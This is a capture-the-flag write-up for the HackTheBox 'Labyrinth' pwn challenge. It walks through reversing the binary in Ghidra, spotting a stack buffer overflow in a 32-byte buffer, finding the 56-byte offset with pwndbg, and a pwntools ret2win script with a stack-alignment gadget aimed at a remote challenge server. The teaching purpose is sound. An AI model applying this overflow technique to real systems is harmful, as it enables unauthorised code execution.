# HTB Labyrinth — Pwn Challenge

Running the binary we get a labyrinth where we have to choose which door to take.

Trying a few doors we get `[-] YOU FAILED TO ESCAPE!`.

## Reversing

We open the binary in Ghidra and find the `main` function. Analyzing it we can see we are expected to enter door `69` or `069`:
```c
local_18 = (char *)malloc(0x10);
fgets(local_18,5,stdin);
iVar1 = strncmp(local_18,"69",2);
if (iVar1 != 0) {
    iVar1 = strncmp(local_18,"069",3);
    if (iVar1 != 0) goto LAB_004015da;
}
fwrite("\nYou are heading to open the door but you suddenly see something on the wall:\n\n\"Fly like a bird and be free!\"\n\nWould you like to change the door you chose?\n\n>> "
       ,1,0xa0,stdout);
fgets(local_38,0x44,stdin);
LAB_004015da:
fprintf(stdout,"\n%s[-] YOU FAILED TO ESCAPE!\n\n",&DAT_00402541);
return 0;
```

After entering the correct door we get a message asking if we want to change our choice. Regardless of input we always end up at `[-] YOU FAILED TO ESCAPE!`.

## Vulnerability

There is a buffer overflow in the second `fgets` call. It reads up to `0x44` (68) bytes, but `local_38` is only 32 bytes:
```
char local_38 [32];
```

There is also a function called `escape_plan` which prints the flag:
```c
void escape_plan(void)
{
  ssize_t sVar1;
  char local_d;
  int local_c;

  putchar(10);
  fwrite(&DAT_00402018,1,0x1f0,stdout);
  fprintf(stdout,
          "\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey : %s\n"
          ,&DAT_0040220e,&DAT_00402209);
  local_c = open("./flag.txt",0);
  if (local_c < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n\n");
    exit(1);
  }
  while( true ) {
    sVar1 = read(local_c,&local_d,1);
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout);
  }
  close(local_c);
  return;
}
```

So the goal is to overwrite the return address to point to `escape_plan`.

## Exploit

First, find the offset to the return address using `cyclic` inside pwndbg:
```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Set a breakpoint right before `main` returns, run the program and paste the cyclic pattern as input for the second `fgets`. 

Running `cyclic -l` gives us the offset:

The offset is **56 bytes**. The address of `escape_plan`:
```
pwndbg> info functions escape_plan
All functions matching regular expression "escape_plan":

Non-debugging symbols:
0x0000000000401255  escape_plan
```

A direct jump to `escape_plan` won't work due to stack misalignment. We prepend a `ret` gadget to fix the 16-byte alignment before calling into `escape_plan`:
```python
from pwn import *

p = remote("154.57.164.65", 31366)
# p = process("./labyrinth")

p.sendlineafter(b"Select door:", b"69")

payload  = b"A" * 56
payload += p64(0x401016)   # ret gadget (stack alignment)
payload += p64(0x401255)   # escape_plan
p.sendlineafter(b">>", payload)

p.interactive()
```

Running the exploit pops the flag.
